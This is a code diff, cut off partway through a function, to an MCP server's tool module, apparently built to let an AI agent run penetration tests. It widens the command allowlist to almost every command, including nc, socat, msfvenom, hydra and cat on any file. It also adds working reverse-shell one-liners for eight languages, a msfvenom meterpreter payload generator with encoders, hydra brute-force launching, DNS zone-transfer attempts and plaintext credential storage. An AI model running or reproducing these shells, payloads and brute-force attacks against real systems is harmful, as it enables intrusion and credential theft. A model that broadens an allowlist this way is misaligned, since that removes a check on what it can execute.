@@ -8,18 +8,26 @@ This module contains the implementations of the tools exposed by the MCP server:
 """
 
 import asyncio
+import base64
+import codecs
+import datetime
+import html as html_module
 import json
+import os
 import platform
 import re
+import shlex
+import urllib.parse
+import xml.etree.ElementTree as ET
 from typing import Sequence, Union, Optional
-import os
-import datetime
 
 import httpx
 import mcp.types as types
 
 # List of allowed commands for security purposes
 # Format: (command_prefix, is_long_running)
+# Since this runs inside an isolated Docker container, commands are
+# allowed broadly. The container itself is the security boundary.
 ALLOWED_COMMANDS = [
     # System information
     ("uname", False),
@@ -30,10 +38,14 @@ ALLOWED_COMMANDS = [
     ("free", False),
     ("df", False),
     ("ps", False),
-    ("top -n 1", False),
-    
+    ("top", False),
+    ("env", False),
+    ("hostname", False),
+    ("arch", False),
+    ("lsb_release", False),
+
     # Network utilities
-    ("ping -c", False),  # Allow ping with count parameter
+    ("ping", False),
     ("ifconfig", False),
     ("ip", False),
     ("netstat", False),
@@ -43,61 +55,136 @@ ALLOWED_COMMANDS = [
     ("host", False),
     ("curl", False),
     ("wget", False),
-    
-    # Security tools
-    ("nmap", True),  # Long-running
-    ("nikto", True),  # Long-running
-    ("gobuster", True),  # Long-running
-    ("dirb", True),  # Long-running
-    ("whois", False),
-    ("sqlmap", True),  # Long-running
-    ("searchsploit", False),
     ("traceroute", False),
-    ("testssl.sh", True),  # Long-running
-    ("amass", True),  # Long-running
-    ("httpx", True),  # Long-running
-    ("subfinder", True),  # Long-running
+    ("arp", False),
+    ("route", False),
+    ("nc", False),
+    ("ncat", False),
+    ("socat", True),
+
+    # Security / pentesting tools
+    ("nmap", True),
+    ("nikto", True),
+    ("gobuster", True),
+    ("dirb", True),
+    ("whois", False),
+    ("sqlmap", True),
+    ("searchsploit", False),
+    ("testssl.sh", True),
+    ("amass", True),
+    ("httpx", True),
+    ("subfinder", True),
     ("waybackurls", False),
-    ("gospider", True),  # Long-running
-    
+    ("gospider", True),
+    ("hydra", True),
+    ("msfvenom", True),
+    ("msfconsole", True),
+    ("msfdb", False),
+    ("smbclient", False),
+    ("smbmap", True),
+    ("enum4linux", True),
+    ("showmount", False),
+    ("hashid", False),
+    ("hashcat", True),
+    ("john", True),
+    ("wpscan", True),
+    ("masscan", True),
+    ("responder", True),
+    ("crackmapexec", True),
+    ("cme", True),
+    ("impacket-", True),
+    ("evil-winrm", True),
+    ("wfuzz", True),
+    ("ffuf", True),
+    ("feroxbuster", True),
+    ("whatweb", False),
+    ("wafw00f", False),
+    ("dnsenum", True),
+    ("dnsrecon", True),
+    ("fierce", True),
+    ("theharvester", True),
+    ("recon-ng", True),
+    ("maltego", True),
+    ("netdiscover", True),
+    ("arpspoof", True),
+    ("ettercap", True),
+    ("bettercap", True),
+    ("aircrack-ng", True),
+    ("airodump-ng", True),
+    ("aireplay-ng", True),
+    ("tcpdump", True),
+    ("tshark", True),
+    ("wireshark", True),
+
     # File analysis tools
     ("file", False),
     ("strings", False),
     ("sha256sum", False),
+    ("sha1sum", False),
     ("md5sum", False),
     ("wc", False),
-    
-    # File operations
+    ("xxd", False),
+    ("hexdump", False),
+    ("binwalk", False),
+    ("exiftool", False),
+    ("objdump", False),
+    ("readelf", False),
+    ("strace", True),
+    ("ltrace", True),
+
+    # File operations — cat is broadly allowed inside the container
     ("ls", False),
-    # Only allow cat on safe files
-    ("cat /proc/", False),
-    ("cat /var/log/", False),
-    ("cat command_output.txt", False),
-    ("cat *.txt", False),
-    ("cat *.log", False),
-    ("cat vuln_scan_", False),
-    ("cat web_enum_", False),
-    ("cat network_discovery_", False),
-    ("cat exploit_search_", False),
-    ("cat file_analysis_", False),
-    ("cat report_", False),
-    ("cat downloads/", False),
-    ("cat spider_", False),
-    ("cat form_analysis_", False),
-    ("cat header_analysis_", False),
-    ("cat ssl_analysis_", False),
-    ("cat subdomain_enum_", False),
-    ("cat web_audit_", False),
+    ("cat", False),
     ("head", False),
     ("tail", False),
-    ("find", True),  # Can be long-running
+    ("less", False),
+    ("more", False),
+    ("find", True),
     ("grep", False),
-    
+    ("awk", False),
+    ("sed", False),
+    ("sort", False),
+    ("uniq", False),
+    ("cut", False),
+    ("tr", False),
+    ("diff", False),
+    ("tee", False),
+    ("xargs", False),
+    ("mkdir", False),
+    ("cp", False),
+    ("mv", False),
+    ("touch", False),
+    ("chmod", False),
+    ("chown", False),
+
     # Utility commands
     ("echo", False),
+    ("printf", False),
     ("which", False),
+    ("whereis", False),
     ("man", False),
     ("help", False),
+    ("history", False),
+    ("alias", False),
+    ("export", False),
+    ("base64", False),
+    ("openssl", False),
+    ("ssh-keygen", False),
+    ("python", False),
+    ("python3", False),
+    ("perl", False),
+    ("ruby", False),
+    ("php", False),
+    ("java", False),
+    ("gcc", False),
+    ("g++", False),
+    ("make", False),
+    ("git", False),
+    ("tar", False),
+    ("gzip", False),
+    ("gunzip", False),
+    ("zip", False),
+    ("unzip", False),
 ]
 
 # --- Session Management Backend ---
@@ -1640,6 +1727,944 @@ async def web_audit(url: str, audit_type: str = "comprehensive") -> Sequence[typ
     except Exception as e:
         return [types.TextContent(type="text", text=f"❌ Error during web audit: {str(e)}")]
 
+# --- Phase 1: Pure Python Tools ---
+
+
+async def encode_decode(data: str, operation: str = "encode", format: str = "base64") -> Sequence[types.TextContent]:
+    """
+    Multi-format encoding/decoding utility.
+
+    Args:
+        data: The data to encode or decode
+        operation: 'encode' or 'decode'
+        format: Encoding format (base64, url, hex, html, rot13)
+
+    Returns:
+        List containing TextContent with the result
+    """
+    try:
+        if format == "base64":
+            if operation == "encode":
+                result = base64.b64encode(data.encode()).decode()
+            else:
+                result = base64.b64decode(data.encode()).decode()
+        elif format == "url":
+            if operation == "encode":
+                result = urllib.parse.quote(data, safe="")
+            else:
+                result = urllib.parse.unquote(data)
+        elif format == "hex":
+            if operation == "encode":
+                result = data.encode().hex()
+            else:
+                result = bytes.fromhex(data).decode()
+        elif format == "html":
+            if operation == "encode":
+                result = html_module.escape(data)
+            else:
+                result = html_module.unescape(data)
+        elif format == "rot13":
+            result = codecs.encode(data, "rot_13")
+        else:
+            return [types.TextContent(type="text", text=f"Unsupported format: {format}. Supported: base64, url, hex, html, rot13")]
+
+        return [types.TextContent(type="text", text=
+            f"Result ({operation} {format}):\n\n"
+            f"Input:  {data}\n"
+            f"Output: {result}"
+        )]
+    except Exception as e:
+        return [types.TextContent(type="text", text=f"Error during {operation} ({format}): {str(e)}")]
+
+
+REVERSE_SHELL_TEMPLATES = {
+    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+    "php": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
+    "powershell": "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
+    "nc": "nc -e /bin/sh {lhost} {lport}",
+    "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+    "java": "Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done\"}});p.waitFor();",
+}
+
+
+async def reverse_shell(lhost: str, shell_type: str = "bash", lport: int = 4444) -> Sequence[types.TextContent]:
+    """
+    Generate reverse shell one-liners for various languages.
+
+    Args:
+        lhost: Listener IP address
+        shell_type: Shell type (bash, python, php, perl, powershell, nc, ruby, java)
+        lport: Listener port (default: 4444)
+
+    Returns:
+        List containing TextContent with the generated command
+    """
+    if shell_type not in REVERSE_SHELL_TEMPLATES:
+        available = ", ".join(REVERSE_SHELL_TEMPLATES.keys())
+        return [types.TextContent(type="text", text=f"Unsupported shell type: {shell_type}. Available: {available}")]
+
+    template = REVERSE_SHELL_TEMPLATES[shell_type]
+    command = template.format(lhost=lhost, lport=lport)
+
+    listener_hint = f"nc -lvnp {lport}"
+
+    return [types.TextContent(type="text", text=
+        f"Reverse Shell ({shell_type})\n"
+        f"{'=' * 40}\n\n"
+        f"LHOST: {lhost}\n"
+        f"LPORT: {lport}\n\n"
+        f"Payload:\n{command}\n\n"
+        f"Listener command:\n{listener_hint}\n\n"
+        f"Note: Ensure you have proper authorization before using this payload."
+    )]
+
+
+HASH_PATTERNS = [
+    (r"^[a-fA-F0-9]{32}$", "MD5", "0", "raw-md5"),
+    (r"^[a-fA-F0-9]{40}$", "SHA-1", "100", "raw-sha1"),
+    (r"^[a-fA-F0-9]{64}$", "SHA-256", "1400", "raw-sha256"),
+    (r"^[a-fA-F0-9]{128}$", "SHA-512", "1700", "raw-sha512"),
+    (r"^\$2[aby]?\$\d{1,2}\$.{53}$", "bcrypt", "3200", "bcrypt"),
+    (r"^\$6\$.+\$.{86}$", "SHA-512 Crypt", "1800", "sha512crypt"),
+    (r"^\$5\$.+\$.{43}$", "SHA-256 Crypt", "7400", "sha256crypt"),
+    (r"^\$1\$.+\$.{22}$", "MD5 Crypt", "500", "md5crypt"),
+    (r"^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$", "NTLM (LM:NT)", "1000", "nt"),
+    (r"^\$apr1\$.+\$.{22}$", "Apache APR1", "1600", ""),
+    (r"^[a-fA-F0-9]{16}$", "MySQL 3.x / Half MD5", "200", "mysql"),
+    (r"^\*[a-fA-F0-9]{40}$", "MySQL 4.1+", "300", "mysql-sha1"),
+    (r"^sha1\$[a-zA-Z0-9]+\$[a-fA-F0-9]{40}$", "Django SHA-1", "124", ""),
+    (r"^pbkdf2_sha256\$.+", "Django PBKDF2-SHA256", "10000", ""),
+]
+
+
+async def hash_identify(hash_value: str) -> Sequence[types.TextContent]:
+    """
+    Identify hash types from hash strings.
+
+    Args:
+        hash_value: The hash string to identify
+
+    Returns:
+        List containing TextContent with identified hash types
+    """
+    hash_value = hash_value.strip()
+    matches = []
+
+    for pattern, name, hashcat_mode, john_format in HASH_PATTERNS:
+        if re.match(pattern, hash_value):
+            entry = f"- **{name}**"
+            if hashcat_mode:
+                entry += f" | Hashcat mode: {hashcat_mode}"
+            if john_format:
+                entry += f" | John format: {john_format}"
+            matches.append(entry)
+
+    # Try hashid binary if available
+    hashid_output = ""
+    try:
+        process = await asyncio.create_subprocess_exec(
+            "hashid", hash_value,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, _ = await asyncio.wait_for(process.communicate(), timeout=10.0)
+        hashid_output = stdout.decode().strip()
+    except Exception:
+        pass
+
+    output = f"Hash Identification\n{'=' * 40}\n\n"
+    output += f"Input: {hash_value}\n"
+    output += f"Length: {len(hash_value)} characters\n\n"
+
+    if matches:
+        output += "Possible hash types (regex matching):\n"
+        output += "\n".join(matches)
+    else:
+        output += "No hash type identified by regex matching."
+
+    if hashid_output:
+        output += f"\n\nhashid output:\n{hashid_output}"
+
+    return [types.TextContent(type="text", text=output)]
+
+
+async def credential_store(
+    action: str = "list",
+    username: Optional[str] = None,
+    password: Optional[str] = None,
+    service: Optional[str] = None,
+    target: Optional[str] = None,
+    notes: Optional[str] = None,
+) -> Sequence[types.TextContent]:
+    """
+    Store/retrieve discovered credentials tied to sessions.
+
+    Args:
+        action: Action to perform (add, list, search)
+        username: Username credential
+        password: Password credential
+        service: Service type (ssh, ftp, http, etc.)
+        target: Target host/IP
+        notes: Additional notes
+
+    Returns:
+        List containing TextContent with credential operation result
+    """
+    # Determine credentials file location
+    active_session = load_active_session()
+    if active_session:
+        creds_dir = get_session_path(active_session)
+        os.makedirs(creds_dir, exist_ok=True)
+        creds_file = os.path.join(creds_dir, "credentials.json")
+    else:
+        creds_file = "credentials.json"
+
+    # Load existing credentials
+    creds = []
+    if os.path.exists(creds_file):
+        try:
+            with open(creds_file, "r") as f:
+                creds = json.load(f)
+        except (json.JSONDecodeError, IOError):
+            creds = []
+
+    if action == "add":
+        if not username:
+            return [types.TextContent(type="text", text="Error: 'username' is required to add a credential.")]
+        entry = {
+            "username": username,
+            "password": password or "",
+            "service": service or "",
+            "target": target or "",
+            "notes": notes or "",
+            "timestamp": datetime.datetime.now().isoformat(),
+        }
+        creds.append(entry)
+        with open(creds_file, "w") as f:
+            json.dump(creds, f, indent=2)
+        return [types.TextContent(type="text", text=
+            f"Credential added successfully.\n\n"
+            f"Username: {username}\n"
+            f"Service: {service or 'N/A'}\n"
+            f"Target: {target or 'N/A'}\n"
+            f"Stored in: {creds_file}\n\n"
+            f"Warning: Credentials are stored in plaintext."
+        )]
+
+    elif action == "list":
+        if not creds:
+            return [types.TextContent(type="text", text=f"No credentials stored in {creds_file}.")]
+        output = f"Stored Credentials ({len(creds)} entries)\n{'=' * 40}\n\n"
+        for i, c in enumerate(creds, 1):
+            output += f"{i}. {c.get('username', 'N/A')}:{c.get('password', 'N/A')}"
+            output += f" @ {c.get('service', 'N/A')}"
+            if c.get("target"):
+                output += f" ({c['target']})"
+            if c.get("notes"):
+                output += f" - {c['notes']}"
+            output += "\n"
+        output += f"\nFile: {creds_file}"
+        return [types.TextContent(type="text", text=output)]
+
+    elif action == "search":
+        search_term = username or service or target or ""
+        if not search_term:
+            return [types.TextContent(type="text", text="Error: Provide username, service, or target to search.")]
+        results = [
+            c for c in creds
+            if search_term.lower() in json.dumps(c).lower()
+        ]
+        if not results:
+            return [types.TextContent(type="text", text=f"No credentials found matching '{search_term}'.")]
+        output = f"Search Results for '{search_term}' ({len(results)} matches)\n{'=' * 40}\n\n"
+        for i, c in enumerate(results, 1):
+            output += f"{i}. {c.get('username', 'N/A')}:{c.get('password', 'N/A')}"
+            output += f" @ {c.get('service', 'N/A')}"
+            if c.get("target"):
+                output += f" ({c['target']})"
+            output += "\n"
+        return [types.TextContent(type="text", text=output)]
+
+    else:
+        return [types.TextContent(type="text", text=f"Unknown action: {action}. Use 'add', 'list', or 'search'.")]
+
+
+# --- Phase 2: Subprocess Wrapper Tools ---
+
+
+async def hydra_attack(
+    target: str,
+    service: str = "ssh",
+    username: Optional[str] = None,
+    userlist: Optional[str] = None,
+    password: Optional[str] = None,
+    passlist: Optional[str] = None,
+    threads: int = 16,
+    extra_opts: str = "",
+) -> Sequence[types.TextContent]:
+    """
+    Brute-force credential testing via hydra.
+
+    Args:
+        target: Target host
+        service: Service to attack (ssh, ftp, http-get, smb, mysql, rdp, etc.)
+        username: Single username
+        userlist: Path to username wordlist
+        password: Single password
+        passlist: Path to password wordlist
+        threads: Number of threads (default: 16)
+        extra_opts: Additional hydra options
+
+    Returns:
+        List containing TextContent with attack status
+    """
+    # Validate credential sources
+    if not username and not userlist:
+        return [types.TextContent(type="text", text="Error: Provide either 'username' or 'userlist'.")]
+    if not password and not passlist:
+        return [types.TextContent(type="text", text="Error: Provide either 'password' or 'passlist'.")]
+
+    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    safe_target = re.sub(r'[^a-zA-Z0-9._-]', '_', target)
+    output_file = f"hydra_{safe_target}_{service}_{timestamp}.txt"
+
+    cmd_parts = ["hydra"]
+    if username:
+        cmd_parts.extend(["-l", shlex.quote(username)])
+    elif userlist:
+        cmd_parts.extend(["-L", shlex.quote(userlist)])
+    if password:
+        cmd_parts.extend(["-p", shlex.quote(password)])
+    elif passlist:
+        cmd_parts.extend(["-P", shlex.quote(passlist)])
+    cmd_parts.extend(["-t", str(threads)])
+    cmd_parts.extend(["-o", output_file])
+    if extra_opts:
+        cmd_parts.append(re.sub(r'[;&|]', '', extra_opts))
+    cmd_parts.append(shlex.quote(target))
+    cmd_parts.append(service)
+
+    command = " ".join(cmd_parts)
+
+    await asyncio.create_subprocess_shell(
+        f"{command} > {output_file} 2>&1 &",
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE,
+    )
+
+    return [types.TextContent(type="text", text=
+        f"Hydra attack launched.\n\n"
+        f"Target: {target}\n"
+        f"Service: {service}\n"
+        f"Threads: {threads}\n"
+        f"Command: {command}\n"
+        f"Output: {output_file}\n\n"
+        f"Check progress: cat {output_file}\n"
+        f"Note: Ensure you have proper authorization."
+    )]
+
+
+MSFVENOM_PAYLOADS = {
+    ("reverse_shell", "linux"): "linux/x86/shell_reverse_tcp",
+    ("reverse_shell", "windows"): "windows/shell_reverse_tcp",
+    ("reverse_shell", "osx"): "osx/x86/shell_reverse_tcp",
+    ("reverse_shell", "php"): "php/reverse_php",
+    ("reverse_shell", "python"): "cmd/unix/reverse_python",
+    ("bind_shell", "linux"): "linux/x86/shell_bind_tcp",
+    ("bind_shell", "windows"): "windows/shell_bind_tcp",
+    ("meterpreter", "linux"): "linux/x86/meterpreter/reverse_tcp",
+    ("meterpreter", "windows"): "windows/meterpreter/reverse_tcp",
+    ("meterpreter", "osx"): "osx/x86/meterpreter/reverse_tcp",
+}
+
+
+async def payload_generate(
+    payload_type: str,
+    platform: str,
+    lhost: str,
+    lport: int = 4444,
+    format: str = "raw",
+    encoder: Optional[str] = None,
+) -> Sequence[types.TextContent]:
+    """
+    Generate payloads using msfvenom.
+
+    Args:
+        payload_type: Type of payload (reverse_shell, bind_shell, meterpreter)
+        platform: Target platform (linux, windows, osx, php, python)
+        lhost: Listener IP address
+        lport: Listener port (default: 4444)
+        format: Output format (elf, exe, raw, python, php, war)
+        encoder: Optional encoder (e.g., x86/shikata_ga_nai)
+
+    Returns:
+        List containing TextContent with generation status
+    """
+    payload_key = (payload_type, platform)
+    payload_str = MSFVENOM_PAYLOADS.get(payload_key)
+    if not payload_str:
+        available = ", ".join(f"{t}/{p}" for t, p in MSFVENOM_PAYLOADS)
+        return [types.TextContent(type="text", text=f"Unsupported payload_type/platform: {payload_type}/{platform}. Available: {available}")]
+
+    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    ext_map = {"elf": "elf", "exe": "exe", "raw": "bin", "python": "py", "php": "php", "war": "war"}
+    ext = ext_map.get(format, "bin")
+    output_file = f"payload_{payload_type}_{platform}_{timestamp}.{ext}"
+
+    cmd_parts = [
+        "msfvenom",
+        "-p", payload_str,
+        f"LHOST={shlex.quote(lhost)}",
+        f"LPORT={lport}",
+        "-f", format,
+        "-o", output_file,
+    ]
+    if encoder:
+        cmd_parts.extend(["-e", shlex.quote(encoder)])
+
+    command = " ".join(cmd_parts)
+
+    process = await asyncio.create_subprocess_shell(
+        f"{command} 2>&1",
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE,
+    )
+    stdout, _ = await asyncio.wait_for(process.communicate(), timeout=120.0)
+    cmd_output = stdout.decode() if stdout else ""
+
+    return [types.TextContent(type="text", text=
+        f"msfvenom payload generation complete.\n\n"
+        f"Payload: {payload_str}\n"
+        f"LHOST: {lhost}\n"
+        f"LPORT: {lport}\n"
+        f"Format: {format}\n"
+        f"Output file: {output_file}\n\n"
+        f"Command: {command}\n"
+        f"Output:\n{cmd_output[:500]}\n\n"
+        f"Note: Ensure you have proper authorization."
+    )]
+
+
+SCAN_PRESETS = {
+    "quick": "-F -sV",
+    "full": "-sS -sV -p-",
+    "stealth": "-sS -T2 --max-retries 1",
+    "udp": "-sU --top-ports 100",
+    "service": "-sV --version-intensity 5 -sC",
+    "aggressive": "-A -T4",
+}
+
+
+async def port_scan(
+    target: str,
+    scan_type: str = "quick",
+    ports: Optional[str] = None,
+) -> Sequence[types.TextContent]:
+    """
+    Smart nmap wrapper with scan presets.
+
+    Args:
+        target: Target IP/hostname
+        scan_type: Scan preset (quick, full, stealth, udp, service, aggressive)
+        ports: Custom port specification (overrides preset)
+
+    Returns:
+        List containing TextContent with scan status
+    """
+    if scan_type not in SCAN_PRESETS:
+        available = ", ".join(SCAN_PRESETS.keys())
+        return [types.TextContent(type="text", text=f"Unknown scan_type: {scan_type}. Available: {available}")]
+
+    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    safe_target = re.sub(r'[^a-zA-Z0-9._-]', '_', target)
+    output_txt = f"port_scan_{safe_target}_{scan_type}_{timestamp}.txt"
+    output_xml = f"port_scan_{safe_target}_{scan_type}_{timestamp}.xml"
+
+    flags = SCAN_PRESETS[scan_type]
+    if ports:
+        flags = re.sub(r'-p[\S]*', '', flags).strip()
+        flags += f" -p {ports}"
+
+    command = f"nmap {flags} -oN {output_txt} -oX {output_xml} {shlex.quote(target)}"
+
+    await asyncio.create_subprocess_shell(
+        f"{command} > /dev/null 2>&1 &",
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE,
+    )
+
+    return [types.TextContent(type="text", text=
+        f"port_scan ({scan_type}) launched.\n\n"
+        f"Target: {target}\n"
+        f"Flags: {flags}\n"
+        f"Command: {command}\n"
+        f"Text output: {output_txt}\n"
+        f"XML output: {output_xml}\n\n"
+        f"Check progress: cat {output_txt}"
+    )]
+
+
+async def dns_enum(
+    domain: str,
+    record_types: str = "all",
+) -> Sequence[types.TextContent]:
+    """
+    Comprehensive DNS enumeration.
+
+    Args:
+        domain: Target domain
+        record_types: Record types to query (all, a, aaaa, mx, ns, txt, cname, soa, srv)
+
+    Returns:
+        List containing TextContent with DNS enumeration results
+    """
+    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    safe_domain = re.sub(r'[^a-zA-Z0-9._-]', '_', domain)
+    output_file = f"dns_enum_{safe_domain}_{timestamp}.txt"
+
+    if record_types == "all":
+        types_list = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "SRV"]
+    else:
+        types_list = [t.strip().upper() for t in record_types.split(",")]
+
+    results = []
+    for rtype in types_list:
+        try:
+            process = await asyncio.create_subprocess_exec(
+                "dig", "+noall", "+answer", domain, rtype,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            stdout, _ = await asyncio.wait_for(process.communicate(), timeout=15.0)
+            output = stdout.decode().strip()
+            results.append(f"--- {rtype} Records ---\n{output if output else 'No records found.'}\n")
+        except asyncio.TimeoutError:
+            results.append(f"--- {rtype} Records ---\nTimeout\n")
+        except Exception as e:
+            results.append(f"--- {rtype} Records ---\nError: {str(e)}\n")
+
+    # Attempt zone transfer
+    zone_transfer = ""
+    try:
+        ns_process = await asyncio.create_subprocess_exec(
+            "dig", "+short", domain, "NS",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        ns_stdout, _ = await asyncio.wait_for(ns_process.communicate(), timeout=10.0)
+        nameservers = [ns.strip().rstrip('.') for ns in ns_stdout.decode().strip().split('\n') if ns.strip()]
+        for ns in nameservers[:3]:
+            try:
+                axfr_process = await asyncio.create_subprocess_exec(
+                    "dig", f"@{ns}", domain, "AXFR",
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+                axfr_stdout, _ = await asyncio.wait_for(axfr_process.communicate(), timeout=10.0)
+                axfr_output = axfr_stdout.decode().strip()
+                if "XFR size" in axfr_output:
+                    zone_transfer += f"\nZone transfer from {ns}:\n{axfr_output}\n"
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+    full_output = f"DNS Enumeration for {domain}\n{'=' * 40}\n\n"
+    full_output += "\n".join(results)
+    if zone_transfer:
+        full_output += f"\n--- Zone Transfer ---\n{zone_transfer}"
+    else:
+        full_output += "\n--- Zone Transfer ---\nNo zone transfer possible (this is normal).\n"
+
+    try:
+        with open(output_file, "w") as f:
+            f.write(full_output)
+    except Exception:
+        pass
+
+    return [types.TextContent(type="text", text=
+        f"dns_enum completed for {domain}.\n\n"
+        f"Records queried: {', '.join(types_list)}\n"
+        f"Output file: {output_file}\n\n"
+        f"{full_output}"
+    )]
+
+
+async def enum_shares(
+    target: str,
+    enum_type: str = "all",
+    username: Optional[str] = None,
+    password: Optional[str] = None,
+) -> Sequence[types.TextContent]:
+    """
+    SMB/NFS share enumeration.
+
+    Args:
+        target: Target host
+        enum_type: Enumeration type (smb, nfs, all)
+        username: Optional SMB username
+        password: Optional SMB password
+
+    Returns:
+        List containing TextContent with share enumeration results
+    """
+    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    safe_target = re.sub(r'[^a-zA-Z0-9._-]', '_', target)
+    output_file = f"enum_shares_{safe_target}_{timestamp}.txt"
+
+    results = []
+
+    if enum_type in ("smb", "all"):
+        # smbclient listing
+        smb_cmd = ["smbclient", "-L", target, "-N"]
+        if username:
+            smb_cmd = ["smbclient", "-L", target, "-U", f"{username}%{password or ''}"]
+        try:
+            process = await asyncio.create_subprocess_exec(
+                *smb_cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30.0)
+            output = stdout.decode() + stderr.decode()
+            results.append(f"--- SMB Shares (smbclient) ---\n{output}\n")
+        except asyncio.TimeoutError:
+            results.append("--- SMB Shares (smbclient) ---\nTimeout\n")
+        except Exception as e:
+            results.append(f"--- SMB Shares (smbclient) ---\nError: {str(e)}\n")
+
+        # enum4linux
+        try:
+            e4l_cmd = f"enum4linux -a {shlex.quote(target)} > {output_file}_e4l 2>&1 &"
+            await asyncio.create_subprocess_shell(
+                e4l_cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            results.append(f"--- enum4linux ---\nRunning in background. Output: {output_file}_e4l\n")
+        except Exception as e:
+            results.append(f"--- enum4linux ---\nError: {str(e)}\n")
+
+    if enum_type in ("nfs", "all"):
+        try:
+            process = await asyncio.create_subprocess_exec(
+                "showmount", "-e", target,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=15.0)
+            output = stdout.decode() + stderr.decode()
+            results.append(f"--- NFS Shares (showmount) ---\n{output}\n")
+        except asyncio.TimeoutError:
+            results.append("--- NFS Shares (showmount) ---\nTimeout\n")
+        except Exception as e:
+            results.append(f"--- NFS Shares (showmount) ---\nError: {str(e)}\n")
+
+    full_output = f"Share Enumeration for {target}\n{'=' * 40}\n\n"
+    full_output += "\n".join(results)
+
+    try:
+        with open(output_file, "w") as f:
+            f.write(full_output)
+    except Exception:
+        pass
+
+    return [types.TextContent(type="text", text=
+        f"enum_shares completed for {target}.\n\n"
+        f"Type: {enum_type}\n"
+        f"Output file: {output_file}\n\n"
+        f"{full_output}"
+    )]
+
+
+# --- Phase 3: Output Parsing Tools ---
+
+
+async def parse_nmap(filepath: str) -> Sequence[types.TextContent]:
+    """
+    Parse nmap output into structured findings.
+
+    Args:
+        filepath: Path to nmap output file (text or XML)
+
+    Returns:
+        List containing TextContent with parsed results
+    """
+    if not os.path.exists(filepath):
+        return [types.TextContent(type="text", text=f"Error: File not found: {filepath}")]
+
+    try:
+        with open(filepath, "r") as f:
+            content = f.read()
+    except Exception as e:
+        return [types.TextContent(type="text", text=f"Error reading file: {str(e)}")]
+
+    findings: dict = {"hosts": [], "open_ports": [], "services": [], "os_detection": [], "scripts": []}
+    is_xml = content.strip().startswith("<?xml") or "<nmaprun" in content[:200]
+
+    if is_xml:
+        try:
+            root = ET.fromstring(content)
+            for host_el in root.findall(".//host"):
+                addr_el = host_el.find("address")
+                addr = addr_el.get("addr", "unknown") if addr_el is not None else "unknown"
+                findings["hosts"].append(addr)
+
+                for port_el in host_el.findall(".//port"):
+                    state_el = port_el.find("state")
+                    if state_el is not None and state_el.get("state") == "open":
+                        portid = port_el.get("portid", "?")
+                        protocol = port_el.get("protocol", "?")
+                        svc_el = port_el.find("service")
+                        svc_name = svc_el.get("name", "unknown") if svc_el is not None else "unknown"
+                        svc_product = svc_el.get("product", "") if svc_el is not None else ""
+                        svc_version = svc_el.get("version", "") if svc_el is not None else ""
+                        findings["open_ports"].append(f"{portid}/{protocol}")
+                        svc_str = svc_name
+                        if svc_product:
+                            svc_str += f" ({svc_product}"
+                            if svc_version:
+                                svc_str += f" {svc_version}"
+                            svc_str += ")"
+                        findings["services"].append(f"{portid}/{protocol}: {svc_str}")
+
+                for script_el in host_el.findall(".//script"):
+                    sid = script_el.get("id", "unknown")
+                    soutput = script_el.get("output", "")
+                    findings["scripts"].append(f"{sid}: {soutput[:100]}")
+
+                os_el = host_el.find(".//osmatch")
+                if os_el is not None:
+                    findings["os_detection"].append(os_el.get("name", "unknown"))
+        except ET.ParseError as e:
+            return [types.TextContent(type="text", text=f"XML parse error: {str(e)}")]
+    else:
+        # Text format parsing
+        for line in content.split("\n"):
+            # Host detection
+            host_match = re.search(r'Nmap scan report for (\S+)', line)
+            if host_match:
+                findings["hosts"].append(host_match.group(1))
+
+            # Open ports
